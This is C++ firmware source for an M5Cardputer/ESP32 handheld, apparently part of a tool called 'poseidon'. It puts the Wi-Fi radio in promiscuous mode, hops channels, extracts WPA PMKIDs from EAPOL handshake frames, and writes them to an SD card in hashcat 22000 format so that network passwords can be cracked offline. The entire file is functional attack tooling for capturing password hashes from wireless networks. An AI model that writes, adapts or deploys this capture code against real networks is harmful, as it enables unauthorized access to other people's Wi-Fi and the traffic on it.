/*
 * wifi_pmkid — passive EAPOL M1 capture to hashcat 22000 format.
 *
 * Listens in promiscuous for 802.1X EAPOL-Key frames. PMKID is embedded
 * in the RSN/WPA IE of the first EAPOL message from the AP. Extracts
 * BSSID, station MAC, SSID (from earlier beacon capture), and the 16-byte
 * PMKID. Writes one line per capture to /poseidon/hashcat.22000.
 *
 * Users feed that file into hashcat mode 22000 to crack offline.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>

static volatile uint32_t s_captured = 0;
static volatile uint32_t s_eapol_seen = 0;
static volatile uint8_t  s_current_ch = 1;
static volatile bool     s_running = false;
static File              s_out;

/* Minimal BSSID → SSID cache populated from beacons. */
struct bssid_ssid_t { uint8_t bssid[6]; char ssid[33]; };
#define BS_CACHE 32
static bssid_ssid_t s_cache[BS_CACHE];
static int          s_cache_n = 0;

static const char *ssid_for(const uint8_t *bssid)
{
    for (int i = 0; i < s_cache_n; ++i)
        if (memcmp(s_cache[i].bssid, bssid, 6) == 0) return s_cache[i].ssid;
    return "";
}

static void cache_beacon(const uint8_t *bssid, const uint8_t *tags, int len)
{
    if (len < 2 || tags[0] != 0 || tags[1] == 0 || tags[1] > 32) return;
    int idx = -1;
    for (int i = 0; i < s_cache_n; ++i)
        if (memcmp(s_cache[i].bssid, bssid, 6) == 0) { idx = i; break; }
    if (idx < 0) {
        if (s_cache_n >= BS_CACHE) return;
        idx = s_cache_n++;
        memcpy(s_cache[idx].bssid, bssid, 6);
    }
    memcpy(s_cache[idx].ssid, tags + 2, tags[1]);
    s_cache[idx].ssid[tags[1]] = '\0';
}

static void hex_append(char *buf, const uint8_t *data, int n)
{
    int off = strlen(buf);
    for (int i = 0; i < n; ++i) off += sprintf(buf + off, "%02x", data[i]);
}

/* Parse the EAPOL-Key M1 for a PMKID in the RSN IE. */
static void try_extract_pmkid(const uint8_t *frame, int len, uint8_t current_ch)
{
    /* We expect a QoS Data frame (type 2, subtype 8) or plain data,
     * containing LLC/SNAP header + EAPOL + Key descriptor. */
    if (len < 40) return;
    uint8_t fc  = frame[0];
    uint8_t subtype = (fc >> 4) & 0xF;
    uint8_t type    = (fc >> 2) & 0x3;
    if (type != 2) return;  /* data */

    int hdr_len = 24;
    /* QoS adds 2 bytes. */
    if (subtype & 0x8) hdr_len += 2;
    /* Order bit implies HT control — skip conservatively. */

    const uint8_t *bssid = &frame[4];  /* Addr1 for AP→STA */
    const uint8_t *sta   = &frame[10]; /* Addr2 (sender) */

    if (len < hdr_len + 8) return;
    /* LLC+SNAP must be 0xAAAA03 000000 then ethertype 888E (EAPOL). */
    const uint8_t *llc = frame + hdr_len;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return;

    s_eapol_seen++;

    const uint8_t *eapol = llc + 8;
    int eapol_len = len - (int)(eapol - frame);
    if (eapol_len < 95) return;
    /* EAPOL header: version(1) type(1) body_length(2) */
    if (eapol[1] != 0x03) return;  /* not EAPOL-Key */
    /* Key descriptor follows. Look for RSN IE with PMKID field at end. */
    /* The 802.11-specific key data comes at offset 95 (key_data_length). */
    uint16_t kd_len = ((uint16_t)eapol[93] << 8) | eapol[94];
    if (kd_len < 22) return;  /* smallest PMKID TLV is 22 bytes */
    const uint8_t *kd = eapol + 95;
    if (eapol_len < 95 + kd_len) return;

    /* Walk TLVs looking for vendor specific PMKID. */
    int off = 0;
    while (off + 2 < kd_len) {
        uint8_t tlv_type = kd[off];
        uint8_t tlv_len  = kd[off + 1];
        if (off + 2 + tlv_len > kd_len) break;
        /* PMKID KDE: type 0xDD (vendor specific), OUI 00:0F:AC, KDE type 4. */
        if (tlv_type == 0xDD && tlv_len >= 20 &&
            kd[off + 2] == 0x00 && kd[off + 3] == 0x0F && kd[off + 4] == 0xAC &&
            kd[off + 5] == 0x04) {
            const uint8_t *pmkid = kd + off + 6;
            const char *ssid = ssid_for(bssid);
            if (!s_out) return;
            /* hashcat 22000 line:
               WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_HEX*** */
            char line[300] = "WPA*01*";
            hex_append(line, pmkid, 16);
            strcat(line, "*");
            hex_append(line, bssid, 6);
            strcat(line, "*");
            hex_append(line, sta, 6);
            strcat(line, "*");
            char *essid_slot = line + strlen(line);
            (void)essid_slot;
            for (size_t i = 0; i < strlen(ssid); ++i) {
                char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
                strcat(line, h);
            }
            strcat(line, "***\n");
            s_out.print(line);
            s_out.flush();
            (void)current_ch;
            s_captured++;
            return;
        }
        off += 2 + tlv_len;
    }
}

static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    if (type == WIFI_PKT_MGMT) {
        uint8_t st = (pkt->payload[0] >> 4) & 0xF;
        if (st == 0x8 || st == 0x5) {
            /* beacon / probe response — cache BSSID→SSID. */
            cache_beacon(pkt->payload + 16, pkt->payload + 36, len - 36 - 4);
        }
    } else if (type == WIFI_PKT_DATA) {
        try_extract_pmkid(pkt->payload, len, s_current_ch);
    }
}

static void hop_task(void *)
{
    while (s_running) {
        s_current_ch = (s_current_ch % 13) + 1;
        esp_wifi_set_channel(s_current_ch, WIFI_SECOND_CHAN_NONE);
        delay(500);
    }
    vTaskDelete(nullptr);
}

void feat_wifi_pmkid(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    if (!SD.begin()) { ui_toast("SD needed", COL_BAD, 1500); return; }
    SD.mkdir("/poseidon");
    s_out = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!s_out) { ui_toast("cant open file", COL_BAD, 1500); return; }

    s_captured = 0;
    s_eapol_seen = 0;
    s_cache_n = 0;
    s_current_ch = 1;
    s_running = true;

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_channel(s_current_ch, WIFI_SECOND_CHAN_NONE);

    xTaskCreate(hop_task, "pmkid_hop", 3072, nullptr, 4, nullptr);

    ui_clear_body();
    ui_draw_footer("`=stop");
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print("PMKID CAPTURE");
    d.drawFastHLine(4, BODY_Y + 12, 120, COL_BAD);

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            d.fillRect(0, BODY_Y + 18, SCR_W, 60, COL_BG);
            d.setTextColor(COL_FG, COL_BG);
            d.setCursor(4, BODY_Y + 18); d.printf("channel: %u", s_current_ch);
            d.setCursor(4, BODY_Y + 30); d.printf("EAPOLs:  %lu", (unsigned long)s_eapol_seen);
            d.setTextColor(s_captured > 0 ? COL_GOOD : COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 42); d.printf("PMKIDs:  %lu", (unsigned long)s_captured);
            d.setTextColor(COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 60); d.print("/poseidon/hashcat.22000");
            ui_draw_status(radio_name(), "pmkid");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }

    s_running = false;
    esp_wifi_set_promiscuous(false);
    if (s_out) { s_out.flush(); s_out.close(); }
    delay(150);
}
